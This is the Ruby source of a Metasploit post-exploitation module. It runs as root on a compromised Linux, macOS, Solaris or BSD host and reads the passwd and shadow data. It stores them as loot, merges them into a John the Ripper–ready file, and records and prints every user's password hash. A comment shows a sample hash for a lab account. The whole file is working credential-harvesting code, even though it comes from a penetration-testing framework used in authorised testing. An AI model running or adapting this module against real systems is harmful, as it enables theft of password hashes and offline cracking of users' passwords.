##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix::Priv
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather Dump Password Hashes for Linux Systems',
        'Description'   => %q{ Post Module to dump the password hashes for all users on a Linux System},
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Carlos Perez <carlos_perez[at]darkoperator.com>', # original osx/linux/solaris versions
          'egypt' # consolidation
        ],
        'Platform'      => [ 'linux', 'osx', 'solaris', 'bsd' ],
        'SessionTypes'  => [ 'shell' ]
      ))

  end

  # Run Method for when run command is issued
  def run
    if is_root?
      passwd_data = getent_passwd
      shadow_data = getent_shadow

      # Save in loot the passwd and shadow file
      store_loot("unix.shadow", "text/plain", session, shadow_data, "shadow.txt", "Unix Password Shadow File")
      store_loot("unix.passwd", "text/plain", session, passwd_data, "passwd.txt", "Unix Passwd File")

      # Unshadow the files
      john_file = unshadow(passwd_data, shadow_data)
      john_file.each_line do |l|
        hash_parts = l.split(':')

        credential_data = {
          jtr_format: 'md5,des,bsdi,crypt',
          origin_type: :session,
          post_reference_name: self.refname,
          private_type: :nonreplayable_hash,
          private_data: hash_parts[1],
          session_id: session_db_id,
          username: hash_parts[0],
          workspace_id: myworkspace_id
        }
        create_credential(credential_data)
        print_good(l.chomp)
      end
      # Save pwd file
      upassf = store_loot("unix.hashes", "text/plain", session, john_file, "unshadowed_passwd.pwd", "Unshadowed Password File")
      print_good("Unshadowed Password File: #{upassf}")

    else
      print_error("You must run this module as root!")
    end

  end

  # Combine passwd + shadow for consumption by JtR, keeping only those
  # accounts that have passwords
  #
  # @param passwd_data [String] contents of /etc/passwd or equivalent
  # @param shadow_data [String] contents of /etc/shadow or equivalent
  # @return [String] all accounts with passwords
  def unshadow(passwd_data, shadow_data)
    unshadowed = ""
    shadow_lines = shadow_data.lines.map { |line| line.split(':', 3) }

    passwd_data.each_line do |passwd_line|
      user, _= passwd_line.split(':', 2)

      _, hash, _ = shadow_lines.find { |line| line.first == user }

      # Don't bother with locked/disabled accounts
      if hash !~ /^(?:\*$|!)/
        # Replace an 'x' preceded by the username and succeeded by a colon,
        # with the captured hash; e.g. this:
        #    msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
        # into this:
        #    msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
        unshadowed << passwd_line.sub(/(?<=^#{user}:)x(?=:)/, hash)
      end
    end

    unshadowed
  end

end
